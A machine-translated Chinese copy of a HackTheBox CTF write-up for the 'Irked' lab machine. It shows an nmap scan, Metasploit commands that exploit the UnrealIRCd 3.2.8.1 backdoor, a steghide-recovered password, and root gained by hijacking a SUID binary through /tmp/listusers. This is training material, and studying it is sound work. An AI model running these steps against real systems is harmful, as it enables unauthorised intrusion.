<html>
<head>
<title>HackTheBox Write-up Irked</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HackTheBox写的很烦</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-write-up-irked-4f1911ca1511?source=collection_archive---------0-----------------------#2019-04-27">https://infosecwriteups.com/hackthebox-write-up-irked-4f1911ca1511?source=collection_archive---------0-----------------------#2019-04-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="f81f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kl">这是该机</em> <a class="ae km" href="https://www.hackthebox.eu/home/machines/profile/163" rel="noopener ugc nofollow" target="_blank"> <em class="kl">的特写</em> </a> <em class="kl">出自</em><a class="ae km" href="https://www.hackthebox.eu/" rel="noopener ugc nofollow" target="_blank"><em class="kl">HackTheBox</em></a></p><blockquote class="kn ko kp"><p id="9926" class="jn jo kl jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">生活只能向后理解，但必须向前看。</p><p id="a4e8" class="jn jo kl jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">—匿名</p></blockquote><h1 id="f839" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">摘要</h1><p id="e1a6" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">Irked是一台基于Linux平台的中等水平的CTF型机器。通过利用IRC我们获得初始外壳，通过利用SUID二进制获得用户和自己的根</p><blockquote class="kn ko kp"><p id="79a9" class="jn jo kl jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">机器作者:<a class="ae km" href="https://www.hackthebox.eu/home/users/profile/624" rel="noopener ugc nofollow" target="_blank"> MrAgent </a> <br/>机器类型:Linux <br/>机器级别:4.4/10</p></blockquote><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/351d36a3ea2a26d0fc70e2bc0cb207a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:498/format:webp/1*Kt366ue5FH43Gn6eJz2R8w.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">机器地图</figcaption></figure></div><div class="ab cl mi mj hu mk" role="separator"><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn"/></div><div class="ij ik il im in"><h1 id="f973" class="kt ku iq bd kv kw mp ky kz la mq lc ld le mr lg lh li ms lk ll lm mt lo lp lq bi translated">专有技术</h1><ul class=""><li id="2761" class="mu mv iq jp b jq lr ju ls jy mw kc mx kg my kk mz na nb nc bi translated">Nmap</li><li id="3c3b" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated">Searchsploit</li><li id="472a" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated">Metasploit</li></ul><h1 id="d8bc" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">吸收技能</h1><ul class=""><li id="3394" class="mu mv iq jp b jq lr ju ls jy mw kc mx kg my kk mz na nb nc bi translated">未实现的漏洞利用</li><li id="0031" class="mu mv iq jp b jq nd ju ne jy nf kc ng kg nh kk mz na nb nc bi translated"><a class="ae km" href="https://www.cvedetails.com/cve/CVE-2010-2075/" rel="noopener ugc nofollow" target="_blank">CVE-2010–2075</a></li></ul><h1 id="b441" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">扫描网络</h1><pre class="lx ly lz ma gt ni nj nk nl aw nm bi"><span id="5df4" class="nn ku iq nj b gy no np l nq nr">$nmap -sC -sV 10.10.10.117</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ns"><img src="../Images/0425fb3df029ca5608474e3e94d9aad6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5TufCyta0Br_WKpOIxVZ0g.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">man nmap</figcaption></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi nx"><img src="../Images/9e3219b86099a1a548155e5de30bb240.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1-AV4ogWZeDTabCb4Edflg.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">nmap结果</figcaption></figure><p id="f2fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">网络服务器没有任何有趣的东西。我试了试<strong class="jp ir">牙钻</strong>，但没有发现任何有趣的东西。索引文件里有唯一的表情符号。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/4eeba00dc529b1574cace4c7e451357b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*CjAylYPGOZWTQ-BPz3Fb4g.png"/></div></figure><p id="283c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">IRC的运行对我们来说很有趣，让我们试着深入了解一下。</p><p id="9937" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用Searchsploit我们发现<strong class="jp ir"> UnrealIRCd </strong>易受攻击<strong class="jp ir">。在谷歌上搜索这个漏洞时，我发现了一个Metasploit模块。</strong></p><div class="nz oa gp gr ob oc"><a href="https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor" rel="noopener  ugc nofollow" target="_blank"><div class="od ab fo"><div class="oe ab of cl cj og"><h2 class="bd ir gy z fp oh fr fs oi fu fw ip bi translated">3.2.8.1后门命令执行| Rapid7</h2><div class="oj l"><h3 class="bd b gy z fp oh fr fs oi fu fw dk translated">这个模块利用了一个恶意后门，它被添加到虚幻的3.2.8.1 IRCD下载档案。</h3></div><div class="ok l"><p class="bd b dl z fp oh fr fs oi fu fw dk translated">www.rapid7.com</p></div></div></div></a></div><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi ol"><img src="../Images/0bd9a04a711ee0a4176adb6ecfe25431.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RQGQSMM-CSirFcXci5482g.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">搜索结果</figcaption></figure><h1 id="9eda" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">利用服务器</h1><pre class="lx ly lz ma gt ni nj nk nl aw nm bi"><span id="01d1" class="nn ku iq nj b gy no np l nq nr">msf &gt;use exploit/unix/irc/unreal_ircd_3281_backdoor<br/>msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set RPORT 6697<br/>msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set RHOST 10.10.10.117<br/>msf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi om"><img src="../Images/5bd282d089f69d8a3e87f6ea38942acb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5m9716LY5U5TatDw67J7qQ.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">使用MSF利用漏洞</figcaption></figure><p id="bbad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这给出了外壳，使用python我们得到了交互式外壳。</p><pre class="lx ly lz ma gt ni nj nk nl aw nm bi"><span id="21cb" class="nn ku iq nj b gy no np l nq nr">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi on"><img src="../Images/fd5f308b134b03bf372123a1dff81c89.png" data-original-src="https://miro.medium.com/v2/resize:fit:1052/format:webp/1*hEGH_GD0fwH6TF4Pm2fyhQ.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">低特权外壳</figcaption></figure><p id="6fe0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">利用IRC漏洞我们得到了低权限外壳，搜索<strong class="jp ir"> user.txt </strong>文件，我发现<strong class="jp ir"> user.txt </strong>在其他用户文档文件夹中，但是我们没有权限打开该文件。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/de280ac60bc1c65527cf77953ed99cd0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1036/format:webp/1*tLf6T8owS2SWKbWjvov4Gw.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">User.txt文件位置</figcaption></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi op"><img src="../Images/06c283b216eae85a10f3be248fbac1c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1186/format:webp/1*BvsrUNOXsmMU08oNec34Rg.png"/></div></figure><p id="e7ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">。备份</strong>文件给了我们一些有趣的信息。</p><blockquote class="kn ko kp"><p id="ed7c" class="jn jo kl jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated"><strong class="jp ir">超级精英steg备份pw </strong></p><p id="0d4e" class="jn jo kl jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated"><strong class="jp ir">upupdowndownlrbabassss</strong></p></blockquote><p id="e816" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以密码和某种隐写术有关。Steghide是最常见的使用密码的隐写工具。</p><p id="77d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">试试这个<strong class="jp ir">upupdowndownlrbabassson</strong>irked.jpg镜像给我们密码。在索引页上。</p><p id="ff1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要安装steghide:-</p><pre class="lx ly lz ma gt ni nj nk nl aw nm bi"><span id="56ec" class="nn ku iq nj b gy no np l nq nr">apt-get install steghide</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/7d7dc013279b06a221a5bf0b500f28bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:884/format:webp/1*5HpSAahQSEmqY2nEqoBFpw.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">隐藏信息</figcaption></figure><blockquote class="kn ko kp"><p id="3e1f" class="jn jo kl jp b jq jr js jt ju jv jw jx kq jz ka kb kr kd ke kf ks kh ki kj kk ij bi translated">密码:Kab6h+m+bbp2J:HG</p></blockquote><h1 id="4c75" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">自己的用户</h1><pre class="lx ly lz ma gt ni nj nk nl aw nm bi"><span id="e945" class="nn ku iq nj b gy no np l nq nr">$ su djmardov</span><span id="b7c0" class="nn ku iq nj b gy or np l nq nr">Password: Kab6h+m+bbp2J:HG</span><span id="e23e" class="nn ku iq nj b gy or np l nq nr">$ cat djmardov/Documents/user.txt</span></pre><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi os"><img src="../Images/70d642de51734c7e1c455da226437e77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1082/format:webp/1*4h4fMdWfSwfWMKIc0thxIg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">User.txt</figcaption></figure><h1 id="9c09" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">特许升级</h1><div class="nz oa gp gr ob oc"><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="noopener  ugc nofollow" target="_blank"><div class="od ab fo"><div class="oe ab of cl cj og"><h2 class="bd ir gy z fp oh fr fs oi fu fw ip bi translated">基本Linux权限提升</h2><div class="oj l"><h3 class="bd b gy z fp oh fr fs oi fu fw dk translated">在开始之前，我想指出——我不是专家。据我所知，没有</h3></div><div class="ok l"><p class="bd b dl z fp oh fr fs oi fu fw dk translated">blog.g0tmi1k.com</p></div></div><div class="ot l"><div class="ou l ov ow ox ot oy mc oc"/></div></div></a></div><pre class="lx ly lz ma gt ni nj nk nl aw nm bi"><span id="f90a" class="nn ku iq nj b gy no np l nq nr">$ find / -perm -u=s -type f 2&gt;/dev/null<br/><br/>/tmp/listusers/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br/>/usr/lib/eject/dmcrypt-get-device<br/>/usr/lib/policykit-1/polkit-agent-helper-1<br/>/usr/lib/openssh/ssh-keysign<br/>/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper<br/>/usr/sbin/exim4<br/>/usr/sbin/pppd<br/>/usr/bin/chsh<br/>/usr/bin/procmail<br/>/usr/bin/gpasswd<br/>/usr/bin/newgrp<br/>/usr/bin/at<br/>/usr/bin/pkexec<br/>/usr/bin/X<br/>/usr/bin/passwd<br/>/usr/bin/chfn<br/>/usr/bin/viewuser<br/>/sbin/mount.nfs<br/>/bin/su<br/>/bin/mount<br/>/bin/fusermount<br/>/bin/ntfs-3g<br/>/bin/umount</span></pre><p id="2182" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找到一个非标准的Linux二进制文件<code class="fe oz pa pb nj b"><strong class="jp ir">/usr/bin/viewuser.</strong></code></p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pc"><img src="../Images/286cf41ff528cce14ae7879860254725.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rg9tjcaRqCxYn9Wtfi1LjQ.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">/usr/bin/viewuser</figcaption></figure><p id="5e6e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该应用程序正在执行<strong class="jp ir"> /tmp/listusers。</strong>所以让我们在listusers中插入一个shell，然后再运行一次。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/2de61544a4ff3491a596a197516312f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:714/format:webp/1*ZWhtRMzkD1tDnwVR1fU9qw.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">带外壳的列表集</figcaption></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/3b4a40b5ac7021e3200c452f592cb8b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*vq4xCg71N42UAkUH19EzpA.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">获得根</figcaption></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/6b4cc09135f44159cafb6641f8b51474.png" data-original-src="https://miro.medium.com/v2/resize:fit:644/format:webp/1*jCVyAcKbSBYS-mLKMxZPGg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">切换到交互式shell</figcaption></figure><h1 id="ce75" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">自己的根</h1><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/a8c1803827c521aff3160ba08188377b.png" data-original-src="https://miro.medium.com/v2/resize:fit:648/format:webp/1*Oq4Vq-tiFK8UwrVsrL5orQ.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">Root.txt</figcaption></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/1f6163e2819b35764f07e3351a202dd4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1030/format:webp/1*1OlETJhSo6zBFdkb85Q1AQ.png"/></div></figure></div><div class="ab cl mi mj hu mk" role="separator"><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn"/></div><div class="ij ik il im in"><div class="lx ly lz ma gt oc"><a href="https://medium.com/@yashanand155" rel="noopener follow" target="_blank"><div class="od ab fo"><div class="oe ab of cl cj og"><h2 class="bd ir gy z fp oh fr fs oi fu fw ip bi translated">增量中等</h2><div class="oj l"><h3 class="bd b gy z fp oh fr fs oi fu fw dk translated">写一些很酷的文章，别忘了去看看。</h3></div><div class="ok l"><p class="bd b dl z fp oh fr fs oi fu fw dk translated">medium.com</p></div></div><div class="ot l"><div class="pi l ov ow ox ot oy mc oc"/></div></div></a></div></div><div class="ab cl mi mj hu mk" role="separator"><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn mo"/><span class="ml bw bk mm mn"/></div><div class="ij ik il im in"><p id="739b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kl">感谢阅读！如果你喜欢这个故事，请点击</em><strong class="jp ir"><em class="kl"/></strong>👏<strong class="jp ir"> <em class="kl">按钮，分享</em> </strong> <em class="kl">帮助他人！欢迎发表评论</em>💬<em class="kl">下图。有反馈？下面我们连线上</em> <a class="ae km" href="https://twitter.com/yashanand155" rel="noopener ugc nofollow" target="_blank"> <em class="kl">推特</em> </a> <em class="kl">。</em></p><h2 id="62eb" class="nn ku iq bd kv pj pk dn kz pl pm dp ld jy pn po lh kc pp pq ll kg pr ps lp pt bi translated">❤️由<a class="ae km" href="https://twitter.com/yashanand155" rel="noopener ugc nofollow" target="_blank">增加到</a></h2></div></div>    
</body>
</html>